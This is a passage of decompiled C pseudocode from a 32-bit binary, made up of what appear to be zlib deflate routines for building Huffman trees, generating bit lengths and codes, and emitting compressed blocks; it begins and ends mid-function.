    a1[1298] = v15 - 1;
    sub_406A70((int)a1, (int)v3, 1);
    v17 = a1[726];
    v18 = a1[1299] - 1;
    a1[1299] = v18;
    a1[v18 + 725] = v16;
    v19 = a1[1299] - 1;
    a1[1299] = v19;
    a1[v19 + 725] = v17;
    *v26 = v3[2 * v16] + v3[2 * v17];
    if ( *((_BYTE *)a1 + v16 + 5200) < *((_BYTE *)a1 + v17 + 5200) )
      v20 = *((_BYTE *)a1 + v17 + 5200);
    else
      v20 = *((_BYTE *)a1 + v16 + 5200);
    *((_BYTE *)a1 + v25 + 5200) = v20 + 1;
    v3[2 * v17 + 1] = v25;
    v3[2 * v16 + 1] = v25;
    a1[726] = v25++;
    v26 += 2;
    sub_406A70((int)a1, (int)v3, 1);
  }
  while ( (int)a1[1298] >= 2 );
  v21 = a1[726];
  v22 = a1[1299] - 1;
  a1[1299] = v22;
  a1[v22 + 725] = v21;
  sub_406B50(a1, a2);
  return sub_406D80(v3, v24, (int)(a1 + 717));
}

//----- (00406A70) --------------------------------------------------------
int __cdecl sub_406A70(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // edx
  int v5; // ebp
  int v6; // ecx
  bool v7; // cc
  int v8; // esi
  int v9; // ebp
  unsigned __int16 v10; // dx
  unsigned __int16 v11; // bx
  int v12; // esi
  unsigned __int16 v13; // dx
  unsigned __int16 v14; // bx
  int v15; // edx
  int v16; // edx
  int v17; // [esp+14h] [ebp+4h]

  result = a1;
  v4 = *(_DWORD *)(a1 + 5192);
  v5 = *(_DWORD *)(a1 + 4 * a3 + 2900);
  v6 = 2 * a3;
  v7 = 2 * a3 < v4;
  v17 = v5;
  if ( 2 * a3 > v4 )
  {
    *(_DWORD *)(result + 4 * a3 + 2900) = v5;
  }
  else
  {
    while ( 1 )
    {
      if ( v7 )
      {
        v8 = *(_DWORD *)(result + 4 * v6 + 2904);
        v9 = *(_DWORD *)(result + 4 * v6 + 2900);
        v10 = *(_WORD *)(a2 + 4 * v8);
        v11 = *(_WORD *)(a2 + 4 * v9);
        if ( v10 < v11 || v10 == v11 && *(_BYTE *)(v8 + result + 5200) <= *(_BYTE *)(result + v9 + 5200) )
          ++v6;
        v5 = v17;
      }
      v12 = *(_DWORD *)(result + 4 * v6 + 2900);
      v13 = *(_WORD *)(a2 + 4 * v5);
      v14 = *(_WORD *)(a2 + 4 * v12);
      if ( v13 < v14 )
      {
LABEL_12:
        *(_DWORD *)(result + 4 * a3 + 2900) = v5;
        return result;
      }
      if ( v13 == v14 && *(_BYTE *)(result + v5 + 5200) <= *(_BYTE *)(v12 + result + 5200) )
        break;
      v15 = a3;
      a3 = v6;
      v6 *= 2;
      *(_DWORD *)(result + 4 * v15 + 2900) = v12;
      v16 = *(_DWORD *)(result + 5192);
      v7 = v6 < v16;
      if ( v6 > v16 )
        goto LABEL_12;
    }
    *(_DWORD *)(result + 4 * a3 + 2900) = v5;
  }
  return result;
}

//----- (00406B50) --------------------------------------------------------
__int16 __cdecl sub_406B50(_DWORD *a1, int *a2)
{
  int v2; // ebx
  int *v3; // eax
  int v4; // ebp
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // esi
  int v10; // ecx
  int v11; // eax
  int v12; // edi
  int v13; // esi
  bool v14; // zf
  int v15; // edi
  _WORD *i; // ecx
  int v17; // edi
  _WORD *v18; // ebp
  int v19; // ebp
  int v20; // ecx
  _WORD *v21; // esi
  int v22; // eax
  int v24; // [esp+10h] [ebp-1Ch]
  int v25; // [esp+14h] [ebp-18h]
  int v26; // [esp+18h] [ebp-14h]
  _WORD *v27; // [esp+18h] [ebp-14h]
  int v28; // [esp+1Ch] [ebp-10h]
  int v29; // [esp+20h] [ebp-Ch]
  int v30; // [esp+24h] [ebp-8h]
  int v31; // [esp+28h] [ebp-4h]
  int *v32; // [esp+30h] [ebp+4h]
  int v33; // [esp+30h] [ebp+4h]
  int v34; // [esp+34h] [ebp+8h]

  v2 = *a2;
  v3 = (int *)a2[2];
  v28 = a2[1];
  v4 = v3[4];
  v25 = *v3;
  v30 = v3[1];
  v29 = v3[2];
  v24 = 0;
  memset(a1 + 717, 0, 0x20u);
  v6 = a1[1299];
  v31 = v4;
  *(_WORD *)(v2 + 4 * a1[v6 + 725] + 2) = 0;
  v7 = a1[1299] + 1;
  if ( v7 < 573 )
  {
    v32 = &a1[v7 + 725];
    v8 = 573 - v7;
    v9 = 573;
    v26 = v8;
    v34 = 573;
    do
    {
      v10 = *v32;
      v11 = *(unsigned __int16 *)(v2 + 4 * *(unsigned __int16 *)(v2 + 4 * *v32 + 2) + 2) + 1;
      if ( v11 > v4 )
      {
        v11 = v4;
        ++v24;
      }
      *(_WORD *)(v2 + 4 * v10 + 2) = v11;
      if ( v10 <= v28 )
      {
        ++*((_WORD *)a1 + v11 + 1434);
        v12 = 0;
        if ( v10 >= v29 )
          v12 = *(_DWORD *)(v30 + 4 * (v10 - v29));
        v13 = *(unsigned __int16 *)(v2 + 4 * v10);
        a1[1448] += v13 * (v12 + v11);
        if ( v25 )
        {
          v4 = v31;
          a1[1449] += v13 * (v12 + *(unsigned __int16 *)(v25 + 4 * v10 + 2));
        }
        v9 = 573;
      }
      LOWORD(v6) = v26 - 1;
      v14 = v26 == 1;
      ++v32;
      --v26;
    }
    while ( !v14 );
    v15 = v24;
    if ( v24 )
    {
      do
      {
        v6 = v4 - 1;
        for ( i = (_WORD *)a1 + v4 + 1433; !*i; --v6 )
          --i;
        --*((_WORD *)a1 + v6 + 1434);
        *((_WORD *)a1 + v6 + 1435) += 2;
        --*((_WORD *)a1 + v4 + 1434);
        v15 -= 2;
      }
      while ( v15 > 0 );
      v17 = v4;
      if ( v4 )
      {
        v18 = (_WORD *)a1 + v4 + 1434;
        v27 = v18;
        do
        {
          v6 = (unsigned __int16)*v18;
          v33 = v6;
          if ( *v18 )
          {
            v19 = (int)&a1[v9 + 725];
            do
            {
              v20 = *(_DWORD *)(v19 - 4);
              v19 -= 4;
              --v34;
              if ( v20 <= v28 )
              {
                v21 = (_WORD *)(v2 + 4 * v20 + 2);
                HIWORD(v22) = 0;
                if ( (unsigned __int16)*v21 != v17 )
                {
                  LOWORD(v22) = *v21;
                  a1[1448] += *(unsigned __int16 *)(v2 + 4 * v20) * (v17 - v22);
                  *v21 = v17;
                }
                v6 = --v33;
              }
            }
            while ( v6 );
            v9 = v34;
          }
          --v17;
          v18 = --v27;
        }
        while ( v17 );
      }
    }
  }
  return v6;
}

//----- (00406D80) --------------------------------------------------------
unsigned int __cdecl sub_406D80(_WORD *a1, int a2, int a3)
{
  __int16 v3; // ax
  char *v4; // ecx
  int v5; // esi
  __int16 v6; // di
  unsigned int result; // eax
  int v9; // edi
  int v10; // ecx
  unsigned __int16 v11; // dx
  char v13[30]; // [esp+Ah] [ebp-1Eh] BYREF

  v3 = 0;
  v4 = v13;
  v5 = 15;
  do
  {
    v6 = *(_WORD *)&v4[a3 - (_DWORD)v13];
    v4 += 2;
    v3 = 2 * (v3 + v6);
    --v5;
    *((_WORD *)v4 - 1) = v3;
  }
  while ( v5 );
  result = a2;
  if ( a2 >= 0 )
  {
    v9 = a2 + 1;
    do
    {
      v10 = (unsigned __int16)a1[1];
      if ( (_WORD)v10 )
      {
        v11 = *(_WORD *)&v13[2 * v10 - 2];
        *(_WORD *)&v13[2 * v10 - 2] = v11 + 1;
        result = sub_407C10(v11, v10);
        *a1 = result;
      }
      a1 += 2;
      --v9;
    }
    while ( v9 );
  }
  return result;
}

//----- (00406E00) --------------------------------------------------------
int __cdecl sub_406E00(int a1)
{
  int result; // eax

  sub_406E70((_WORD *)a1, a1 + 140, *(_DWORD *)(a1 + 2836));
  sub_406E70((_WORD *)a1, a1 + 2432, *(_DWORD *)(a1 + 2848));
  sub_406830((_DWORD *)a1, (int *)(a1 + 2856));
  for ( result = 18; result >= 3; --result )
  {
    if ( *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41F6E4[result] + 2678) )
      break;
  }
  *(_DWORD *)(a1 + 5792) += 3 * result + 17;
  return result;
}

//----- (00406E70) --------------------------------------------------------
int __cdecl sub_406E70(_WORD *a1, int a2, int a3)
{
  int result; // eax
  int v4; // ecx
  int v5; // edi
  int v6; // edx
  int v7; // esi
  unsigned __int16 *v8; // ebp
  int v9; // eax
  int v10; // [esp+Ch] [ebp-4h]
  int v11; // [esp+18h] [ebp+8h]

  result = a2;
  v4 = *(unsigned __int16 *)(a2 + 2);
  v5 = 0;
  v10 = -1;
  v6 = 7;
  v7 = 4;
  if ( !(_WORD)v4 )
  {
    v6 = 138;
    v7 = 3;
  }
  *(_WORD *)(a2 + 4 * a3 + 6) = -1;
  if ( a3 >= 0 )
  {
    v11 = a3 + 1;
    v8 = (unsigned __int16 *)(result + 6);
    do
    {
      v9 = v4;
      v4 = *v8;
      if ( ++v5 >= v6 || v9 != v4 )
      {
        if ( v5 >= v7 )
        {
          if ( v9 )
          {
            if ( v9 != v10 )
              ++a1[2 * v9 + 1338];
            ++a1[1370];
          }
          else if ( v5 > 10 )
          {
            ++a1[1374];
          }
          else
          {
            ++a1[1372];
          }
        }
        else
        {
          a1[2 * v9 + 1338] += v5;
        }
        v5 = 0;
        v10 = v9;
        if ( v4 )
        {
          if ( v9 == v4 )
          {
            v6 = 6;
            v7 = 3;
          }
          else
          {
            v6 = 7;
            v7 = 4;
          }
        }
        else
        {
          v6 = 138;
          v7 = 3;
        }
      }
      v8 += 2;
      result = --v11;
    }
    while ( v11 );
  }
  return result;
}

//----- (00406F60) --------------------------------------------------------
int __cdecl sub_406F60(int a1, int a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // edi
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // edi
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // eax
  int v18; // edx
  int v19; // ecx
  int v20; // edi
  int v21; // edx
  int v22; // edx
  int i; // edi
  int v24; // ecx
  unsigned __int16 v25; // ax
  int v26; // edx
  int v27; // ecx
  int v28; // ebx
  int v29; // edx
  int v30; // edx

  v4 = *(_DWORD *)(a1 + 5812);
  if ( v4 <= 11 )
  {
    *(_WORD *)(a1 + 5808) |= (a2 - 257) << v4;
    *(_DWORD *)(a1 + 5812) = v4 + 5;
  }
  else
  {
    v5 = (a2 - 257) << v4;
    v6 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v5;
    *(_BYTE *)(v6 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v7 = *(_DWORD *)(a1 + 8);
    LOBYTE(v5) = *(_BYTE *)(a1 + 5809);
    v8 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v8;
    *(_BYTE *)(v8 + v7) = v5;
    v9 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v9 - 11;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)(a2 - 257) >> (16 - v9);
  }
  v10 = *(_DWORD *)(a1 + 5812);
  if ( v10 <= 11 )
  {
    *(_WORD *)(a1 + 5808) |= (a3 - 1) << v10;
    *(_DWORD *)(a1 + 5812) = v10 + 5;
  }
  else
  {
    v11 = (a3 - 1) << v10;
    v12 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v11;
    *(_BYTE *)(v12 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v13 = *(_DWORD *)(a1 + 8);
    LOBYTE(v11) = *(_BYTE *)(a1 + 5809);
    v14 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v14;
    *(_BYTE *)(v14 + v13) = v11;
    v15 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v15 - 11;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)(a3 - 1) >> (16 - v15);
  }
  v16 = *(_DWORD *)(a1 + 5812);
  v17 = a4 - 4;
  if ( v16 <= 12 )
  {
    *(_WORD *)(a1 + 5808) |= v17 << v16;
    *(_DWORD *)(a1 + 5812) = v16 + 4;
  }
  else
  {
    v18 = v17 << v16;
    v19 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v18;
    *(_BYTE *)(v19 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v20 = *(_DWORD *)(a1 + 8);
    v21 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v21;
    *(_BYTE *)(v21 + v20) = *(_BYTE *)(a1 + 5809);
    v22 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v22 - 12;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)v17 >> (16 - v22);
  }
  for ( i = 0; i < a4; ++i )
  {
    v24 = *(_DWORD *)(a1 + 5812);
    if ( v24 <= 13 )
    {
      *(_WORD *)(a1 + 5808) |= *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41F6E4[i] + 2678) << v24;
      *(_DWORD *)(a1 + 5812) = v24 + 3;
    }
    else
    {
      v25 = *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41F6E4[i] + 2678);
      v26 = v25 << v24;
      v27 = *(_DWORD *)(a1 + 20);
      *(_WORD *)(a1 + 5808) |= v26;
      *(_BYTE *)(v27 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
      v28 = *(_DWORD *)(a1 + 8);
      v29 = *(_DWORD *)(a1 + 20) + 1;
      *(_DWORD *)(a1 + 20) = v29;
      *(_BYTE *)(v29 + v28) = *(_BYTE *)(a1 + 5809);
      v30 = *(_DWORD *)(a1 + 5812);
      ++*(_DWORD *)(a1 + 20);
      *(_DWORD *)(a1 + 5812) = v30 - 13;
      *(_WORD *)(a1 + 5808) = v25 >> (16 - v30);
    }
  }
  sub_4071D0(a1, a1 + 140, a2 - 1);
  return sub_4071D0(a1, a1 + 2432, a3 - 1);
}

//----- (004071D0) --------------------------------------------------------
int __cdecl sub_4071D0(int a1, unsigned int a2, int a3)
{
  __int64 v3; // rax
  int v4; // ebx
  int v5; // ecx
  int v6; // esi
  int v7; // edi
  int v8; // ebp
  int v9; // ecx
  int v10; // esi
  int v11; // edi
  int v12; // ecx
  int v13; // ebx
  int v14; // edi
  int v15; // edi
  int v16; // ecx
  int v17; // esi
  int v18; // edi
  int v19; // ecx
  int v20; // ebx
  int v21; // edi
  int v22; // edi
  int v23; // ecx
  int v24; // esi
  int v25; // edi
  int v26; // ecx
  int v27; // ebx
  int v28; // edi
  int v29; // edi
  int v30; // ecx
  int v31; // esi
  int v32; // ecx
  int v33; // edi
  int v34; // esi
  int v35; // esi
  int v36; // ecx
  int v37; // ecx
  int v38; // esi
  int v39; // edi
  int v40; // ecx
  int v41; // ebx
  int v42; // edi
  int v43; // edi
  int v44; // ecx
  int v45; // esi
  int v46; // ecx
  int v47; // edi
  int v48; // esi
  int v49; // esi
  int v50; // ecx
  int v51; // esi
  int v52; // edi
  int v53; // ecx
  int v54; // ebx
  int v55; // edi
  int v56; // edi
  int v57; // ecx
  int v58; // esi
  int v59; // ecx
  int v60; // edi
  int v61; // esi
  int v62; // esi
  bool v63; // zf
  int v65; // [esp+Ch] [ebp-8h]
  int v66; // [esp+10h] [ebp-4h]
  int v67; // [esp+18h] [ebp+4h]
  int v68; // [esp+1Ch] [ebp+8h]
  unsigned __int16 *v69; // [esp+20h] [ebp+Ch]

  v3 = a2;
  v4 = *(unsigned __int16 *)(a2 + 2);
  v65 = -1;
  v5 = 7;
  v6 = 4;
  if ( !(_WORD)v4 )
  {
    v5 = 138;
    v6 = 3;
  }
  if ( a3 >= 0 )
  {
    v7 = a3 + 1;
    v69 = (unsigned __int16 *)(a2 + 6);
    LODWORD(v3) = a1;
    v66 = v7;
    do
    {
      v8 = v4;
      ++HIDWORD(v3);
      v4 = *v69;
      v67 = v4;
      v68 = HIDWORD(v3);
      if ( SHIDWORD(v3) < v5 && v8 == v4 )
        goto LABEL_44;
      if ( SHIDWORD(v3) < v6 )
      {
        do
        {
          v9 = *(_DWORD *)(v3 + 5812);
          v10 = *(unsigned __int16 *)(v3 + 4 * v8 + 2678);
          if ( v9 <= 16 - (unsigned __int16)v10 )
          {
            *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 4 * v8 + 2676) << v9;
            *(_DWORD *)(v3 + 5812) = v10 + v9;
          }
          else
          {
            WORD2(v3) = *(_WORD *)(v3 + 4 * v8 + 2676);
            v11 = WORD2(v3) << v9;
            v12 = *(_DWORD *)(v3 + 8);
            *(_WORD *)(v3 + 5808) |= v11;
            *(_BYTE *)(v12 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
            v13 = *(_DWORD *)(v3 + 8);
            LOBYTE(v12) = *(_BYTE *)(v3 + 5809);
            v14 = *(_DWORD *)(v3 + 20) + 1;
            *(_DWORD *)(v3 + 20) = v14;
            *(_BYTE *)(v14 + v13) = v12;
            v15 = *(_DWORD *)(v3 + 5812);
            ++*(_DWORD *)(v3 + 20);
            *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v15);
            *(_DWORD *)(v3 + 5812) = v15 + v10 - 16;
            HIDWORD(v3) = v68;
          }
          v68 = --HIDWORD(v3);
        }
        while ( HIDWORD(v3) );
        goto LABEL_39;
      }
      if ( v8 )
      {
        if ( v8 != v65 )
        {
          v16 = *(_DWORD *)(v3 + 5812);
          v17 = *(unsigned __int16 *)(v3 + 4 * v8 + 2678);
          if ( v16 <= 16 - (unsigned __int16)v17 )
          {
            *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 4 * v8 + 2676) << v16;
            *(_DWORD *)(v3 + 5812) = v17 + v16;
          }
          else
          {
            WORD2(v3) = *(_WORD *)(v3 + 4 * v8 + 2676);
            v18 = WORD2(v3) << v16;
            v19 = *(_DWORD *)(v3 + 8);
            *(_WORD *)(v3 + 5808) |= v18;
            *(_BYTE *)(v19 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
            v20 = *(_DWORD *)(v3 + 8);
            LOBYTE(v19) = *(_BYTE *)(v3 + 5809);
            v21 = *(_DWORD *)(v3 + 20) + 1;
            *(_DWORD *)(v3 + 20) = v21;
            *(_BYTE *)(v21 + v20) = v19;
            v22 = *(_DWORD *)(v3 + 5812);
            ++*(_DWORD *)(v3 + 20);
            *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v22);
            *(_DWORD *)(v3 + 5812) = v22 + v17 - 16;
            HIDWORD(v3) = v68;
          }
          v68 = --HIDWORD(v3);
        }
        v23 = *(_DWORD *)(v3 + 5812);
        v24 = *(unsigned __int16 *)(v3 + 2742);
        if ( v23 <= 16 - (unsigned __int16)v24 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2740) << v23;
          *(_DWORD *)(v3 + 5812) = v24 + v23;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2740);
          v25 = WORD2(v3) << v23;
          v26 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v25;
          *(_BYTE *)(v26 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v27 = *(_DWORD *)(v3 + 8);
          LOBYTE(v26) = *(_BYTE *)(v3 + 5809);
          v28 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v28;
          *(_BYTE *)(v28 + v27) = v26;
          v29 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v29);
          *(_DWORD *)(v3 + 5812) = v29 + v24 - 16;
          HIDWORD(v3) = v68;
        }
        v30 = *(_DWORD *)(v3 + 5812);
        if ( v30 > 14 )
        {
          HIDWORD(v3) -= 3;
          v31 = HIDWORD(v3) << v30;
          v32 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v31;
          *(_BYTE *)(v32 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v33 = *(_DWORD *)(v3 + 8);
          LOBYTE(v32) = *(_BYTE *)(v3 + 5809);
          v34 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v34;
          *(_BYTE *)(v34 + v33) = v32;
          v35 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v35 - 14;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v35);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 3) << v30;
        v36 = v30 + 2;
      }
      else if ( SHIDWORD(v3) > 10 )
      {
        v50 = *(_DWORD *)(v3 + 5812);
        v51 = *(unsigned __int16 *)(v3 + 2750);
        if ( v50 <= 16 - (unsigned __int16)v51 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2748) << v50;
          *(_DWORD *)(v3 + 5812) = v51 + v50;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2748);
          v52 = WORD2(v3) << v50;
          v53 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v52;
          *(_BYTE *)(v53 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v54 = *(_DWORD *)(v3 + 8);
          LOBYTE(v53) = *(_BYTE *)(v3 + 5809);
          v55 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v55;
          *(_BYTE *)(v55 + v54) = v53;
          v56 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v56);
          *(_DWORD *)(v3 + 5812) = v56 + v51 - 16;
          HIDWORD(v3) = v68;
        }
        v57 = *(_DWORD *)(v3 + 5812);
        if ( v57 > 9 )
        {
          HIDWORD(v3) -= 11;
          v58 = HIDWORD(v3) << v57;
          v59 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v58;
          *(_BYTE *)(v59 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v60 = *(_DWORD *)(v3 + 8);
          LOBYTE(v59) = *(_BYTE *)(v3 + 5809);
          v61 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v61;
          *(_BYTE *)(v61 + v60) = v59;
          v62 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v62 - 9;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v62);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 11) << v57;
        v36 = v57 + 7;
      }
      else
      {
        v37 = *(_DWORD *)(v3 + 5812);
        v38 = *(unsigned __int16 *)(v3 + 2746);
        if ( v37 <= 16 - (unsigned __int16)v38 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2744) << v37;
          *(_DWORD *)(v3 + 5812) = v38 + v37;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2744);
          v39 = WORD2(v3) << v37;
          v40 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v39;
          *(_BYTE *)(v40 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v41 = *(_DWORD *)(v3 + 8);
          LOBYTE(v40) = *(_BYTE *)(v3 + 5809);
          v42 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v42;
          *(_BYTE *)(v42 + v41) = v40;
          v43 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v43);
          *(_DWORD *)(v3 + 5812) = v43 + v38 - 16;
          HIDWORD(v3) = v68;
        }
        v44 = *(_DWORD *)(v3 + 5812);
        if ( v44 > 13 )
        {
          HIDWORD(v3) -= 3;
          v45 = HIDWORD(v3) << v44;
          v46 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v45;
          *(_BYTE *)(v46 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v47 = *(_DWORD *)(v3 + 8);
          LOBYTE(v46) = *(_BYTE *)(v3 + 5809);
          v48 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v48;
          *(_BYTE *)(v48 + v47) = v46;
          v49 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v49 - 13;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v49);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 3) << v44;
        v36 = v44 + 3;
      }
      *(_DWORD *)(v3 + 5812) = v36;
LABEL_39:
      v4 = v67;
      HIDWORD(v3) = 0;
      v65 = v8;
      if ( v67 )
      {
        if ( v8 == v67 )
        {
          v5 = 6;
          v6 = 3;
        }
        else
        {
          v5 = 7;
          v6 = 4;
        }
      }
      else
      {
        v5 = 138;
        v6 = 3;
      }
LABEL_44:
      v63 = v66 == 1;
      v69 += 2;
      --v66;
    }
    while ( !v63 );
  }
  return v3;
}

//----- (00407750) --------------------------------------------------------
int __cdecl sub_407750(int a1, int a2, int a3)
{
  int result; // eax
  unsigned int v4; // ecx
  int v5; // ebp
  int v6; // edi
  int v7; // edx
  int v8; // ecx
  unsigned __int16 v9; // si
  int v10; // edx
  int v11; // ecx
  int v12; // ebx
  int v13; // edx
  int v14; // edx
  int v15; // ecx
  int v16; // ecx
  int v17; // ebx
  int v18; // esi
  unsigned __int16 v19; // si
  int v20; // ebp
  int v21; // ebx
  char v22; // cl
  int v23; // ebx
  __int16 v24; // si
  int v25; // ecx
  __int16 v26; // bp
  int v27; // ecx
  int v28; // esi
  int v29; // edx
  int v30; // ecx
  int v31; // ebp
  int v32; // ebx
  char v33; // cl
  int v34; // ebx
  unsigned int v35; // edi
  int v36; // ebx
  int v37; // ecx
  int v38; // esi
  unsigned __int16 v39; // dx
  int v40; // ebp
  int v41; // ebx
  char v42; // cl
  int v43; // ebx
  int v44; // edx
  int v45; // edx
  unsigned int v46; // edi
  int v47; // ecx
  unsigned int v48; // esi
  int v49; // ecx
  int v50; // ebx
  int v51; // esi
  int v52; // esi
  int v53; // ecx
  int v54; // esi
  unsigned __int16 v55; // dx
  int v56; // edi
  int v57; // ecx
  int v58; // ebx
  int v59; // edi
  int v60; // edi
  int v61; // [esp+10h] [ebp-8h]
  unsigned int v62; // [esp+14h] [ebp-4h]
  int v63; // [esp+1Ch] [ebp+4h]
  int v64; // [esp+1Ch] [ebp+4h]

  result = a1;
  v4 = 0;
  v5 = a2;
  if ( *(_DWORD *)(a1 + 5784) )
  {
    while ( 1 )
    {
      v6 = *(unsigned __int16 *)(*(_DWORD *)(result + 5788) + 2 * v4);
      v7 = *(unsigned __int8 *)(v4 + *(_DWORD *)(result + 5776));
      v62 = v4 + 1;
      if ( !(_WORD)v6 )
        break;
      v16 = *(_DWORD *)(result + 5812);
      v17 = (unsigned __int8)byte_41FDF0[v7];
      v63 = v17;
      v18 = *(unsigned __int16 *)(v5 + 4 * v17 + 1030);
      v61 = (unsigned __int16)v18;
      if ( v16 <= 16 - (unsigned __int16)v18 )
      {
        v26 = *(_WORD *)(a2 + 4 * v17 + 1028) << v16;
        v27 = *(_DWORD *)(result + 5812);
        *(_WORD *)(result + 5808) |= v26;
        v25 = v18 + v27;
      }
      else
      {
        v19 = *(_WORD *)(a2 + 4 * v17 + 1028);
        v20 = *(_DWORD *)(result + 8);
        *(_WORD *)(result + 5808) |= v19 << v16;
        *(_BYTE *)(*(_DWORD *)(result + 20) + v20) = *(_BYTE *)(result + 5808);
        v21 = *(_DWORD *)(result + 20) + 1;
        v22 = *(_BYTE *)(result + 5809);
        *(_DWORD *)(result + 20) = v21;
        *(_BYTE *)(*(_DWORD *)(result + 8) + v21) = v22;
        v23 = *(_DWORD *)(result + 5812);
        ++*(_DWORD *)(result + 20);
        v24 = v19 >> (16 - v23);
        v25 = v23 + v61 - 16;
        v17 = v63;
        *(_WORD *)(result + 5808) = v24;
      }
      *(_DWORD *)(result + 5812) = v25;
      v28 = dword_41F5AC[v17];
      if ( v28 )
      {
        v29 = v7 - dword_41FEF0[v17];
        v30 = *(_DWORD *)(result + 5812);
        if ( v30 <= 16 - v28 )
        {
          *(_WORD *)(result + 5808) |= v29 << v30;
          *(_DWORD *)(result + 5812) = v28 + v30;
        }
        else
        {
          v31 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5808) |= v29 << v30;
          *(_BYTE *)(*(_DWORD *)(result + 20) + v31) = *(_BYTE *)(result + 5808);
          v32 = *(_DWORD *)(result + 20) + 1;
          v33 = *(_BYTE *)(result + 5809);
          *(_DWORD *)(result + 20) = v32;
          *(_BYTE *)(*(_DWORD *)(result + 8) + v32) = v33;
          v34 = *(_DWORD *)(result + 5812);
          ++*(_DWORD *)(result + 20);
          *(_WORD *)(result + 5808) = (unsigned __int16)v29 >> (16 - v34);
          *(_DWORD *)(result + 5812) = v34 + v28 - 16;
        }
      }
      v35 = v6 - 1;
      if ( v35 >= 0x100 )
        v36 = (unsigned __int8)byte_41FCF0[v35 >> 7];
      else
        v36 = (unsigned __int8)byte_41FBF0[v35];
      v37 = *(_DWORD *)(result + 5812);
